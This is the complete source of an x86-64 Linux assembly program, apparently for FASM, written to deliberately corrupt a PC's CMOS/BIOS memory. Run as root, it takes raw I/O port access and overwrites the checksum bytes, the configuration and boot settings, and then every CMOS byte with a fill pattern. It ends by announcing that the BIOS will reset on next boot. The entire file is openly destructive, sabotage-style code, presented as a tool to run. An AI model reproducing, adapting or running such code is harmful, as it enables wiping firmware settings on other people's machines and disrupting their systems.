format ELF64 executable 3
entry _start

segment readable executable

_start:
    ; Check if running as root
    mov     rax, 102        ; sys_getuid
    syscall
    cmp     rax, 0
    jnz     error_perm

    ; Get full I/O port access
    mov     rax, 172        ; sys_iopl
    mov     rdi, 3
    syscall
    cmp     rax, 0
    jnz     error_iopl

    ; Multi-layer strategy for maximum compatibility
    
    ; 1. CORRUPT PRIMARY CHECKSUM (Traditional BIOS)
    ; Standard checksum addresses: 0x2E (low) and 0x2F (high)
    call    write_cmos_byte
    db      0x2E, 0xFF      ; Checksum low = 0xFF
    
    call    write_cmos_byte  
    db      0x2F, 0xFF      ; Checksum high = 0xFF

    ; 2. CORRUPT ALTERNATE CHECKSUM (Some AMI/Award BIOS)
    call    write_cmos_byte
    db      0x30, 0xFF      ; Extended checksum
    
    call    write_cmos_byte
    db      0x31, 0xFF

    ; 3. CORRUPT CRITICAL CONFIGURATION BYTES
    ; Boot order and device settings
    mov     rcx, 0x10       ; Start of configuration area
config_loop:
    mov     al, cl
    mov     ah, 0xFF        ; Corrupted value
    call    write_cmos
    
    inc     rcx
    cmp     rcx, 0x3F       ; End of standard area
    jle     config_loop

    ; 4. CORRUPT ENTIRE CMOS RAM (Nuclear approach)
    mov     rcx, 0
total_loop:
    mov     al, cl
    mov     ah, 0xAA        ; Recognizable pattern
    test    cl, 1
    jz      skip_alt
    mov     ah, 0x55        ; Alternating pattern
skip_alt:
    call    write_cmos
    
    inc     rcx
    cmp     rcx, 127        ; All CMOS bytes
    jle     total_loop

    ; 5. EXTRA STRATEGY: ZERO STATUS BYTES
    call    write_cmos_byte
    db      0x0D, 0x00      ; Status register C
    call    write_cmos_byte
    db      0x0E, 0x00      ; Status register D (battery status)
    
    ; Restore NMI
    mov     al, 0x00
    mov     dx, 0x70
    out     dx, al

    ; Success message
    mov     rax, 1          ; sys_write
    mov     rdi, 1          ; stdout
    mov     rsi, msg_success
    mov     rdx, msg_success_len
    syscall

    ; Exit
    mov     rax, 60
    xor     rdi, rdi
    syscall

; Subroutine: write byte to CMOS
; AL = address, AH = value
write_cmos:
    push    rcx
    push    rax
    
    ; Disable NMI and select address
    or      al, 0x80
    mov     dx, 0x70
    out     dx, al
    
    ; Small delay for CMOS
    jmp     short $+2
    jmp     short $+2
    jmp     short $+2
    
    ; Write value
    pop     rax
    push    rax
    mov     al, ah
    mov     dx, 0x71
    out     dx, al
    
    ; Post-write delay
    jmp     short $+2
    jmp     short $+2
    
    pop     rax
    pop     rcx
    ret

; Subroutine: write byte with embedded parameter
write_cmos_byte:
    pop     rsi             ; Get return address (where data is)
    mov     al, [rsi]       ; CMOS address
    mov     ah, [rsi+1]     ; Value
    push    rax
    call    write_cmos
    pop     rax
    add     rsi, 2          ; Move to next byte
    jmp     rsi             ; Return after data

error_iopl:
    mov     rsi, msg_iopl_error
    mov     rdx, msg_iopl_error_len
    jmp     error_exit

error_perm:
    mov     rsi, msg_perm_error  
    mov     rdx, msg_perm_error_len

error_exit:
    mov     rax, 1          ; sys_write
    mov     rdi, 2          ; stderr
    syscall
    
    mov     rax, 60
    mov     rdi, 1
    syscall

segment readable writeable

msg_success db 'CMOS corrupted successfully! BIOS will reset on next boot.', 0x0A
msg_success_len = $ - msg_success

msg_iopl_error db 'Error: Cannot get I/O access (run as root)', 0x0A
msg_iopl_error_len = $ - msg_iopl_error

msg_perm_error db 'Error: Run as root!', 0x0A  
msg_perm_error_len = $ - msg_perm_error